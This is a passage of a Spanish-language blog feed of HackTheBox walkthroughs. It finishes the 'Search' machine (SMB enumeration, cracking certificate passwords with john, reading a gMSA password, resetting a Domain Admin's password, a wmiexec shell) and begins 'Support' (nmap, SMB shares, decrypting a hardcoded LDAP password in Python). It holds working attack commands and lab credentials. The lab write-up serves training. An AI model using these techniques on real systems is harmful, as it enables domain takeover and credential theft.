	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/sierra.frye'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="nv">$sierra</span>.frye
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	<span class="nb">.</span>
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	..
	dw--w--w--                0 Wed Nov 17 19:08:17 2021	Desktop
	dw--w--w--                0 Fri Jul 31 09:42:19 2020	Documents
	dw--w--w--                0 Fri Jul 31 09:45:36 2020	Downloads
	fr--r--r--               33 Wed Nov 17 19:01:45 2021	user.txt
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<h1 id="user-txt">User .txt</h1>

<ul>
  <li>Aquí vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/sierra.frye/user.txt'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>sierra.frye<span class="se">\u</span>ser.txt <span class="o">(</span>33 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/10.129.229.57-RedirectedFolders_sierra.frye_user.txt
➜  content <span class="nb">cat </span>10.129.229.57-RedirectedFolders_sierra.frye_user.txt
0b2ce2a465386c9c4996ba16251795ac
</code></pre></div></div>

<ul>
  <li>Y vemos algo interesante si seguimos enumerando al parecer encontramos certificados.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/sierra.frye/Downloads/Backups'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="nv">$sierra</span>.frye/Downloads/Backups
	dr--r--r--                0 Mon Aug 10 15:39:17 2020	<span class="nb">.</span>
	dr--r--r--                0 Mon Aug 10 15:39:17 2020	..
	fr--r--r--             2643 Fri Jul 31 10:04:11 2020	search-RESEARCH-CA.p12
	fr--r--r--             4326 Mon Aug 10 15:39:17 2020	staff.pfx
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a descargarlos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  certificates smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>sierra.frye<span class="se">\D</span>ownloads<span class="se">\B</span>ackups<span class="se">\s</span>earch-RESEARCH-CA.p12 <span class="o">(</span>2643 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/certificates/10.129.229.57-RedirectedFolders_sierra.frye_Downloads_Backups_search-RESEARCH-CA.p12
➜  certificates smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Sierra.Frye'</span> <span class="nt">-p</span> <span class="s1">'$$49=wide=STRAIGHT=jordan=28$$18'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/sierra.frye/Downloads/Backups/staff.pfx'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>sierra.frye<span class="se">\D</span>ownloads<span class="se">\B</span>ackups<span class="se">\s</span>taff.pfx <span class="o">(</span>4326 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/certificates/10.129.229.57-RedirectedFolders_sierra.frye_Downloads_Backups_staff.pfx
</code></pre></div></div>

<ul>
  <li>Si importamos los certificados vemos que están protegidos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/11.png" />
</p>

<ul>
  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">pfx2john</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  certificates pfx2john search-RESEARCH-CA.p12 <span class="o">&gt;</span> <span class="nb">hash</span>
➜  certificates pfx2john staff.pfx <span class="o">&gt;&gt;</span> <span class="nb">hash</span>
</code></pre></div></div>

<ul>
  <li>Y esta es la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  certificates john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts <span class="o">(</span>pfx, <span class="o">(</span>.pfx, .p12<span class="o">)</span> <span class="o">[</span>PKCS#12 PBE <span class="o">(</span>SHA1/SHA2<span class="o">)</span> 512/512 AVX512BW 16x]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 2000 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>mac-type <span class="o">[</span>1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
misspissy        <span class="o">(</span>search-RESEARCH-CA.p12<span class="o">)</span>
misspissy        <span class="o">(</span>staff.pfx<span class="o">)</span>
2g 0:00:05:18 DONE <span class="o">(</span>2024-04-07 18:15<span class="o">)</span> 0.006282g/s 17229p/s 34458c/s 34458C/s misssnamy..missnono
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Y listo podemos importarlos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/12.png" />
</p>

<ul>
  <li>El certificado se llama <strong>staff</strong> si probamos con esa ruta vemos que funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/13.png" />
</p>

<ul>
  <li>Ahora accedemos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/14.png" />
</p>

<ul>
  <li>Y vemos que estamos un <strong>Windows Powershell Web Access</strong>.</li>
</ul>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Si vamos a <code class="language-plaintext highlighter-rouge">Bloodhound</code> sabemos que estamos como <code class="language-plaintext highlighter-rouge">Sierra.Frye</code> tenemos una manera potencial de escalar privilegios pertenecemos a varios grupos entre esos tenemos el privilegio <code class="language-plaintext highlighter-rouge">ReadGMSAPassword</code> sobre <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> y ese usuario tiene el privilegio <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el usuario <code class="language-plaintext highlighter-rouge">Tristan.Davies</code> que ese usuario pertenece al grupo <code class="language-plaintext highlighter-rouge">Domain Admins</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/15.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/16.png" />
</p>

<ul>
  <li>
    <p>Si somos este usuario <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> podemos cambiarle la contraseña al usuario <code class="language-plaintext highlighter-rouge">TRISTAN.DAVIES</code>.</p>
  </li>
  <li>
    <p>Podemos apoyarnos de este recurso ya que necesitamos obtener la contraseña de <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> <a href="https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#retrieving-themanaged-password">https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#retrieving-themanaged-password</a>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/17.png" />
</p>

<ul>
  <li>Para ver la contraseña tenemos que hacer lo siguiente <a href="https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#decoding-themanaged-password">https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#decoding-themanaged-password</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/18.png" />
</p>

<ul>
  <li>
    <p>Vamos a definir la credencial.</p>
  </li>
  <li>
    <p>Si la contraseña ya esta podemos usar <code class="language-plaintext highlighter-rouge">Invoke-Command</code> para ver si estamos ejecutando comandos como el usuario que queremos.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/19.png" />
</p>

<ul>
  <li>Como tenemos privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre <code class="language-plaintext highlighter-rouge">Tristan.Davies</code> le vamos a cambiar la contraseña.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/20.png" />
</p>

<ul>
  <li>Como le acabamos de cambiar la contraseña a un usuario del <code class="language-plaintext highlighter-rouge">Domain Admins</code> en caso de que nos de <code class="language-plaintext highlighter-rouge">Pwn3d!</code> podemos usar <code class="language-plaintext highlighter-rouge">wmiexec</code> para conectarnos y tendremos privilegios máximos en el dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.229.57 <span class="nt">-u</span> <span class="s1">'tristan.davies'</span> <span class="nt">-p</span> <span class="s1">'nosequeponer$!'</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\t</span>ristan.davies:nosequeponer<span class="nv">$!</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>

<ul>
  <li>Y ya podemos ver la ultima flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-wmiexec search.htb/tristan.davies@10.129.229.57
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> SMBv3.0 dialect used
<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
C:<span class="se">\&gt;</span><span class="nb">whoami
</span>search<span class="se">\t</span>ristan.davies

C:<span class="se">\&gt;</span><span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
5cbe8d044ee14475a7b40e8abd97c5a1
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Support (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/04/11/support.html" rel="alternate" type="text/html" title="HackTheBox - Support (easy)" /><published>2024-04-11T00:00:00-06:00</published><updated>2024-04-11T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/04/11/support</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/04/11/support.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/833a3b1f7f96b5708d19b6de084c3201.png" />
</p>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y sus tecnologias con la herramienta <code class="language-plaintext highlighter-rouge">Nmap</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49711 10.129.245.29 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-29 12:41 CST
Nmap scan report <span class="k">for </span>10.129.245.29
Host is up <span class="o">(</span>0.091s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span class="o">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: support.htb0., Site: Default-First-Site-Name<span class="o">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49711/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   <span class="nb">date</span>: 2024-03-29T18:42:15
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vamos agregar en nombre del dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.245.29
SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>

➜  nmap <span class="nb">echo</span> <span class="s2">"10.129.245.29 support.htb dc.support.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.245.29 support.htb dc.support.htb
</code></pre></div></div>

<ul>
  <li>Si listamos los recursos compartidos por el protocolo <strong>smb</strong> vemos que tenemos acceso a un directorio llamado <strong>support-tools</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.245.29 <span class="nt">-u</span> <span class="s1">'miguel'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.245.29   445    DC               <span class="o">[</span>+] support.htb<span class="se">\m</span>iguel:
SMB         10.129.245.29   445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.129.245.29   445    DC               Share           Permissions     Remark
SMB         10.129.245.29   445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.129.245.29   445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.129.245.29   445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.129.245.29   445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.129.245.29   445    DC               NETLOGON                        Logon server share
SMB         10.129.245.29   445    DC               support-tools   READ            support staff tools
SMB         10.129.245.29   445    DC               SYSVOL                          Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a conectarnos al recurso compartido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap impacket-smbclient support.htb/miguel@10.129.245.29 <span class="nt">-no-pass</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use support-tools</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Wed Jul 20 12:01:06 2022 <span class="nb">.</span>
drw-rw-rw-          0  Sat May 28 06:18:25 2022 ..
<span class="nt">-rw-rw-rw-</span>    2880728  Sat May 28 06:19:19 2022 7-ZipPortable_21.07.paf.exe
<span class="nt">-rw-rw-rw-</span>    5439245  Sat May 28 06:19:55 2022 npp.8.4.1.portable.x64.zip
<span class="nt">-rw-rw-rw-</span>    1273576  Sat May 28 06:20:06 2022 putty.exe
<span class="nt">-rw-rw-rw-</span>   48102161  Sat May 28 06:19:31 2022 SysinternalsSuite.zip
<span class="nt">-rw-rw-rw-</span>     277499  Wed Jul 20 12:01:07 2022 UserInfo.exe.zip
<span class="nt">-rw-rw-rw-</span>      79171  Sat May 28 06:20:17 2022 windirstat1_1_2_setup.exe
<span class="nt">-rw-rw-rw-</span>   44398000  Sat May 28 06:19:43 2022 WiresharkPortable64_3.6.5.paf.exe
</code></pre></div></div>

<ul>
  <li>Encontramos varios <code class="language-plaintext highlighter-rouge">.exe</code> pero sin duda el que llama mas la atención es el <strong>UserInfo.exe.zip</strong> vamos a descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># get UserInfo.exe.zip</span>
</code></pre></div></div>

<ul>
  <li>Antes de descomprimirlo vamos a ver que es lo que hay dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content 7z l UserInfo.exe.zip

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 277499 bytes <span class="o">(</span>271 KiB<span class="o">)</span>

Listing archive: UserInfo.exe.zip

<span class="nt">--</span>
Path <span class="o">=</span> UserInfo.exe.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 277499

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2022-05-27 11:51:05 .....        12288         5424  UserInfo.exe
2022-03-01 12:18:50 .....        99840        41727  CommandLineParser.dll
2021-10-22 17:42:08 .....        22144        12234  Microsoft.Bcl.AsyncInterfaces.dll
2021-10-22 17:48:04 .....        47216        21201  Microsoft.Extensions.DependencyInjection.Abstractions.dll
2021-10-22 17:48:22 .....        84608        39154  Microsoft.Extensions.DependencyInjection.dll
2021-10-22 17:51:24 .....        64112        29081  Microsoft.Extensions.Logging.Abstractions.dll
2020-02-19 04:05:18 .....        20856        11403  System.Buffers.dll
2020-02-19 04:05:18 .....       141184        58623  System.Memory.dll
2018-05-15 07:29:44 .....       115856        32709  System.Numerics.Vectors.dll
2021-10-22 17:40:18 .....        18024         9541  System.Runtime.CompilerServices.Unsafe.dll
2020-02-19 04:05:18 .....        25984        13437  System.Threading.Tasks.Extensions.dll
2022-05-27 10:59:39 .....          563          327  UserInfo.exe.config
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2022-05-27 11:51:05             652675       274861  12 files
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno al parecer hay muchos archivos de configuración así que para ver mejor el contenido y ver que se hace por detrás vamos a pasar el comprimido a una maquina Windows para usar <code class="language-plaintext highlighter-rouge">dnspy</code> y <code class="language-plaintext highlighter-rouge">debugear</code> el archivo <a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a>.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Debugeando</code> encontramos un código interesante.</p>
  </li>
  <li>
    <p>El código configura una conexión LDAP llama a un método <code class="language-plaintext highlighter-rouge">Protected.getPassword()</code> para recuperar una contraseña.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/1.png" />
</p>

<ul>
  <li>Si nos vamos a <code class="language-plaintext highlighter-rouge">Protected</code> vemos el código que al parecer lo que hace es desencriptar una contraseña que esta codificada en <code class="language-plaintext highlighter-rouge">base64</code> y encriptada mediante una operación <code class="language-plaintext highlighter-rouge">XOR</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/2.png" />
</p>

<ul>
  <li>En el campo <code class="language-plaintext highlighter-rouge">enc_password</code> almacena una cadena que es una contraseña encriptada que esta en formato base64 y el campo <code class="language-plaintext highlighter-rouge">key</code> almacena una clave en forma de arreglo la clave parece ser derivada de la cadena <strong>armando</strong>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/support/3.png" />
</p>

<ul>
  <li>
    <p>El problema de esto es que sabemos como funciona todo para poder obtener la contraseña en texto plano podemos usar Python3 para obtenerla simplemente siguiendo el funcionamiento del código.</p>
  </li>
  <li>
    <p>Simplemente ejecutamos <code class="language-plaintext highlighter-rouge">Python3</code> e importamos el modulo <code class="language-plaintext highlighter-rouge">base64</code> para decodificar la contraseña encriptada, después la variable <code class="language-plaintext highlighter-rouge">enc_password</code> contiene la contraseña encriptada, la clave <code class="language-plaintext highlighter-rouge">key</code> contiene la clave para la operación <code class="language-plaintext highlighter-rouge">XOR</code> que en este caso la clave es la cadena <code class="language-plaintext highlighter-rouge">ASCII</code> <strong>armando</strong>, después la contraseña encriptada se decodifica, se realiza la operación mediante un ciclo for que itera sobre cada byte de la contraseña encriptada y lo desencripta utilizando la calve y el valor (223) mediante la operación <code class="language-plaintext highlighter-rouge">XOR</code> y al final el resultado se convierte a una cadena utilizando caracteres <code class="language-plaintext highlighter-rouge">UTF-8</code> y se muestra por pantalla.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3
Python 3.11.8 <span class="o">(</span>main, Feb  7 2024, 21:52:08<span class="o">)</span> <span class="o">[</span>GCC 13.2.0] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> import <span class="nb">base64</span>
<span class="o">&gt;&gt;&gt;</span> enc_password <span class="o">=</span> <span class="s2">"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"</span>
<span class="o">&gt;&gt;&gt;</span> key <span class="o">=</span> bytes<span class="o">(</span><span class="s2">"armando"</span>, <span class="nv">encoding</span><span class="o">=</span><span class="s1">'ascii'</span><span class="o">)</span>
<span class="o">&gt;&gt;&gt;</span> decoded_password <span class="o">=</span> base64.b64decode<span class="o">(</span>enc_password<span class="o">)</span>
<span class="o">&gt;&gt;&gt;</span> decrypted_password <span class="o">=</span> bytes<span class="o">([</span>decoded_password[i] ^ key[i % len<span class="o">(</span>key<span class="o">)]</span> ^ 223 <span class="k">for </span>i <span class="k">in </span>range<span class="o">(</span>len<span class="o">(</span>decoded_password<span class="o">))])</span>
<span class="o">&gt;&gt;&gt;</span> password <span class="o">=</span> decrypted_password.decode<span class="o">(</span><span class="s1">'utf-8'</span><span class="o">)</span>
<span class="o">&gt;&gt;&gt;</span> print<span class="o">(</span><span class="s2">"Decrypted Password:"</span>, password<span class="o">)</span>
Decrypted Password: nvEfEK16^1aM4<span class="nv">$e7AclUf8x$tRWxPWO1</span>%lmz
<span class="o">&gt;&gt;&gt;</span>
</code></pre></div></div>

<h2 id="shell-as-support">Shell as Support</h2>

<ul>
  <li>Una vez tenemos la contraseña en texto plano podemos comprobar si son correctas ya que nos decía que con el usuario <code class="language-plaintext highlighter-rouge">ldap</code> podemos conectarnos al servicio utilizando la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec ldap 10.129.245.29 <span class="nt">-u</span> ldap <span class="nt">-p</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span>
SMB         10.129.245.29   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:support.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        10.129.245.29   389    DC               <span class="o">[</span>+] support.htb<span class="se">\l</span>dap:nvEfEK16^1aM4<span class="nv">$e7AclUf8x$tRWxPWO1</span>%lmz
</code></pre></div></div>

<ul>
  <li>
    <p>Al ver que son correctas podemos enumerar el servicio <code class="language-plaintext highlighter-rouge">ldap</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</a>.</p>
  </li>
  <li>
    <p>Al parecer el output es demasiada información pero si <code class="language-plaintext highlighter-rouge">grepeamos</code> por <code class="language-plaintext highlighter-rouge">info:</code> encontramos una contraseña.</p>
  </li>
</ul>

